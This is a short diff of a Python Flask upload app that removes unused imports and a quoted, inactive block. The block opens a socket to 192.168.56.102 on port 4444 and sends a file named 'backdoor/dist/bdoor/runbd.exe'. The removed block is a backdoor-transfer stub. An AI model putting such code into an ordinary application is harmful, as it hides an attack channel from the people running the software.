@@ -1,10 +1,7 @@
-import socket as s
-import subprocess
 from flask import Flask, render_template, request, redirect
 import flask
 import requests
 import os
-import getpass
 from werkzeug.utils import secure_filename
 import logging
 
@@ -14,14 +11,6 @@ from utils import save
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
-
-
-"""sock = s.socket(s.AF_INET, s.SOCK_STREAM)
-sock.connect(("192.168.56.102", 4444))
-
-f = sock.sendfile("backdoor/dist/bdoor/runbd.exe")
-print(f)
-sock.close()"""
 
 app = Flask(__name__)
 db = "C:/path/to/uploads/"
